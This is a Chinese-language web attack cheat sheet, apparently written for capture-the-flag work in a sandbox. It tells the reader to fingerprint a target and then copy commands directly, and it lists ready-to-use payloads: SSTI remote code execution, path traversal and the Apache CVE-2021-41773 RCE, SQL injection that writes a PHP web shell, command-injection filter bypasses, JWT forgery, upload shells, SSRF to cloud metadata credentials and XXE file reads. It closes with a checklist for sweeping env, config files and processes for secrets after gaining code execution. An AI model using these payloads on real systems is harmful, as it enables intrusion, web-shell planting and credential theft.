# Payload DB — Web（按指纹直接取用，不要重新摸索）

> 用法：先指纹（Server / X-Powered-By / 报错页 / 路由名），命中下面哪一节就直接
> 抄那条命令改目标地址。**目标是把「探索」压成 1~2 条命令**。

## SSTI 模板注入（Jinja2 / Twig / Freemarker / Velocity / ERB）
- 探测：`{{7*7}}`→49 是 Jinja2/Twig；`${7*7}`→49 是 EL/Freemarker；`<%= 7*7 %>` 是 ERB。
- Jinja2 RCE（无需 OOB，直接回显）：
  `{{ cycler.__init__.__globals__.os.popen('id').read() }}`
  `{{ lipsum.__globals__["os"].popen('cat /flag*').read() }}`
  `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`
  被过滤时用属性拼接绕过：`{{ ()["\x5f\x5fclass\x5f\x5f"] }}`、`{{ request|attr('application') }}`。
- Twig：`{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("cat /flag*")}}`
- Freemarker：`<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`
- 模板名可控（SSTI 在文件包含位置）：直接包含 `/flag` 或 `../../etc/passwd`。

## 文件包含 / 路径穿越（LFI）
- 基础：`?page=../../../../etc/passwd`、`....//....//etc/passwd`、`%2e%2e%2f`、`..%252f`。
- PHP 源码读出（防 `.php` 后缀拼接）：`php://filter/convert.base64-encode/resource=index`
  → base64 解码看源码里的 flag / 数据库口令。
- 用 `--path-as-is` 防 curl 归一化：`curl --path-as-is "http://T/static/../../../../etc/passwd"`。
- nginx alias 穿越（off-by-slash）：`/static../etc/passwd`（location `/static` 无尾斜杠时）。
- Apache 2.4.49/2.4.50 CVE-2021-41773/42013：
  `curl --path-as-is "http://T/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"`
  RCE：`/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh` + `echo;id`。

## SQL 注入
- 探测：`'`→500/报错；`' AND 1=1-- -` vs `' AND 1=2-- -` 差分；时间盲注 `' AND SLEEP(3)-- -`。
- UNION：先定列数 `' ORDER BY 5-- -`，再 `' UNION SELECT 1,2,3-- -` 找回显位。
- 读文件（MySQL）：`' UNION SELECT LOAD_FILE('/flag'),2-- -`
- 堆叠注入 + 写文件：`'; SELECT '<?php system($_GET[c]); ?>' INTO OUTFILE '/var/www/html/s.php'-- -`
- SQLite（CTF 常见）：`' UNION SELECT sql,2 FROM sqlite_master-- -`
- 登录绕过：`admin'-- -`、`' OR '1'='1`、`' OR 1=1 LIMIT 1-- -`
- sqlmap 只在手工确认注入点后跑：`sqlmap -u "URL" --batch --level 3 --risk 2 --technique=BEU --dbs`

## 命令注入 / 无回显
- 分隔符依次试：`;id` `|id` `||id` `&&id` `` `id` `` `$(id)` `%0aid`。
- 空格被过滤：`cat</flag`、`cat${IFS}/flag`、`{cat,/flag}`、`cat$IFS$9/flag`。
- 无回显 → 写文件再读，或 DNS/HTTP 出网（本沙箱无公网，**用写文件或时间盲**）：
  `;sleep 5`（时间盲）、`;cat /flag > /var/www/html/o.txt`。

## 反序列化 / 原型链污染（Node / PHP / Python）
- Node 原型链污染（pydash / lodash / merge 类）：
  - 入口：`{"__proto__":{"polluted":1}}`、`{"constructor":{"prototype":{"polluted":1}}}`
  - **pydash 绕过要点**：路径分隔用 `a.b` / `a[0].b` / `a["b"]`；被 denylist 拦时试
    `__init__[["__globals__"]]`、`a..b`、`["\x5f\x5fproto\x5f\x5f"]`、八进制 `\137\137proto\137\137`。
  - Cookie 承载时先 URL 解码再 base64 解码，八进制编码的键名要**解码后**再喂给解析器。
- Python pickle：`?data=` 或 cookie 里 base64 的 pickle → 构造 `__reduce__` 回连/读文件。
- PHP 反序列化：找 `unserialize(` 入口；POP 链从 `__destruct`/`__wakeup` 起。
- Java：`ysoserial` 不在镜像时，手写 `java -jar` 不可用 → 优先找 URLDNS 类 gadget 做确认。

## JWT / 会话
- 解码：`echo "$JWT" | cut -d. -f2 | base64 -d 2>/dev/null`。
- `alg:none`：改 header `{"alg":"none"}`，签名段留空。
- HS256 弱密钥：`hashcat -m 16500 jwt.txt rockyou.txt`（无 rockyou 时试 `secret`/`password`/题名）。
- `kid` 注入：`kid: ../../../../dev/null`（空密钥）、`kid: /proc/self/environ`。
- Flask session：`flask-unsign --decode --cookie '...'`；有 SECRET_KEY 则伪造 `{"admin":true}`。

## 认证绕过 / 越权（IDOR）
- 直接改 ID：`/user/1` → `/user/0` `/user/2` `/api/user?id=1`（试 0、负号、UUID 全零）。
- 头部伪造：`X-Forwarded-For: 127.0.0.1`、`X-Real-IP`、`X-Original-URL: /admin`、
  `X-Rewrite-URL`、`X-Custom-IP-Authorization: 127.0.0.1`。
- 路径绕过：`/admin/`、`/admin/.`、`//admin`、`/admin%2f`、`/./admin`、`/ADMIN`、`/admin;`。
- 数组参数绕过 PHP 弱比较：`?role[]=admin`、`?id[]=1`。
- 注册同名用户 / 改邮箱大小写 / 空格 → 覆盖管理员。

## 上传 / 解析
- 后缀黑名单绕过：`.phtml .php5 .php7 .pht .phar .php.`（尾点）`.php%00.jpg`。
- 内容检测绕过：`GIF89a;` 开头 + PHP 体；`<script language=php>`；短标签 `<?=`.
- 双扩展名：`shell.php.jpg`；大小写：`.PHP`；`.htaccess` 上传改解析。
- 图片马：`exiftool -Comment='<?php system($_GET[c]);?>' a.jpg` 后配合 LFI 包含。

## SSRF
- 内网探：`http://127.0.0.1:PORT/`、`http://0.0.0.0/`、`http://[::1]/`、`http://localhost/`。
- 云元数据：`http://169.254.169.254/latest/meta-data/`、`.../iam/security-credentials/`。
- 协议：`gopher://`（打 Redis/MySQL）、`file:///flag`、`dict://`。
- 绕过白名单：`http://evil@allowed/`、`http://allowed.evil.com/`、`http://127.1/`、
  `http://2130706433/`（十进制 IP）、`http://0x7f.1/`、重定向跳转。
- 无回显 SSRF：用**时间盲**（指向自己的慢端口）或读内网服务响应体差异。

## XXE
- 经典：`<!DOCTYPE r [<!ENTITY x SYSTEM "file:///flag">]><r>&x;</r>`（回显）。
- 无回显 OOB 不可用（无公网）→ 用**报错回显**：`file:///nonexistent/&x;` 让错误里带出内容。
- PHP 过滤器：`<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/flag">`。

## Post-RCE flag hunt checklist (measured: getResourceAsStream("flag") is a loser bet)
Once code exec works, hunt in this order (one batched command, not one path per turn):
1. `env` — flags are frequently injected as environment variables.
2. Filesystem sweep of likely spots: `ls -la / /root /home/* /var/www/* /app /opt 2>/dev/null | grep -iE "flag|secret|key"` plus `find / -maxdepth 3 -iname "*flag*" -type f 2>/dev/null`.
3. Web root / app config (`config.php`, `.env`, `application.yml`, `settings.py`) — creds and flag pointers live there.
4. Process args (`ps auxww`) and cron/systemd unit files.
Java classloader resource streams only see the JVM classpath — for file reads in
Gremlin RCE prefer `new java.io.File("/flag").text` style or `["/bin/sh","-c","..."]`
exec with full output capture.
